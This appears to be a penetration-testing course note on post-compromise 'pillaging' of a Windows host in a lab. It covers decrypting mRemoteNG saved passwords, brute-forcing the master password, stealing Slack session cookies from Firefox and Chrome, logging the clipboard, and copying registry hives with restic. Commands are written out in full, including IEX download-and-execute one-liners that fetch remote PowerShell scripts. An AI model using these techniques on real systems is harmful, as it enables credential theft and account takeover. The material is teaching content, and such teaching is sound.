# Pillaging

### **What’s Pillaging ?**

**Pillaging** is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

## **Scenario**

Let's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.

![image.png](<../../../../.gitbook/assets/image (39).png>)

### **Installed Applications**

Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest.

We will also find typical applications such as Office, remote management systems, IM clients, etc. We can use `dir` or `ls` to check the content of `Program Files` and `Program Files (x86)` to find which applications are installed

#### **Identifying Common Applications**

```powershell
C:\>dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 900E-A7ED

 Directory of C:\Program Files

07/14/2022  08:31 PM    <DIR>          .
07/14/2022  08:31 PM    <DIR>          ..
05/16/2022  03:57 PM    <DIR>          Adobe
05/16/2022  12:33 PM    <DIR>          Corsair
05/16/2022  10:17 AM    <DIR>          Google
05/16/2022  11:07 AM    <DIR>          Microsoft Office 15
07/10/2022  11:30 AM    <DIR>          mRemoteNG
07/13/2022  09:14 AM    <DIR>          OpenVPN
07/19/2022  09:04 PM    <DIR>          Streamlabs OBS
07/20/2022  07:06 AM    <DIR>          TeamViewer
               0 File(s)              0 bytes
              16 Dir(s)  351,524,651,008 bytes free
```

#### use PowerShell and read the Windows registry

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
...SNIP...
```

We can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org/) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.

### **mRemoteNG**

`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

> By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

#### **Discover mRemoteNG Configuration Files**

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

#### Display confCons.xml

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

> Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password

`Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master passord used to encrypt the document

#### **Decrypt the Password with mremoteng\_decrypt**

```bash
irix@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

#### Decrypt With master password

if we try to decrypt password with usually way we notice the error occur so we assume we know master password and we will try to decrypt using it

```bash
python3 mremoteng_decrypt.py -s "<encrypted-string>" -p <master_password>

```

#### **For Loop to Crack the Master Password with mremoteng\_decrypt**

```bash
irix@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

<SNIP>
```

***

## **Abusing Cookies to Get Access to IM Clients**

instant messaging (IM) applications like `Slack` and `Microsoft Teams` we will try to get cookies for slack App

### **Cookie Extraction from Firefox**

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`

#### **Copy Firefox Cookies Database**

we will try to copy cookies.sqlite database in our device

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

#### **Extract Slack Cookie from Firefox Cookies Database**

Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

```bash
irix@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

Now that we have the cookie, we can use any browser extension to add the cookie to our browser.

we use  extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/) to add cookies

<figure><img src="../../../../.gitbook/assets/image 1 (21).png" alt=""><figcaption></figcaption></figure>

### **Cookie Extraction from Chromium-based Browsers**

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

#### **PowerShell Script - Invoke-SharpChromium**

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done.
```

`SharpChromium` search on sqlite in default path `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`  but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.

#### **Copy Cookies to SharpChromium Expected Location**

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

#### **Invoke-SharpChromium Cookies Extraction**

```powershell
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
```

***

## **Clipboard**

#### **Monitor the Clipboard with PowerShell**

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

***

## **Roles and Services**

Typical server roles and services include: File and Print Servers, Web and Database Servers, Backup Servers

Let's take `Backup Servers` as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.

### **Attacking Backup Servers**

**`Restic`** is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). On our target machine, restic is located at `C:\Windows\System32\restic.exe`.

We first need to create and initialize the location where our backup will be saved, called the `repository`.

#### **restic - Initialize Backup Directory**

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Then we can create our first backup.

#### **restic - Back up a Directory**

```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

#### **restic - Back up a Directory with VSS**

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

#### **restic - Check Backups Saved in a Repository**

```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

#### **restic - Restore a Backup with ID**

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```
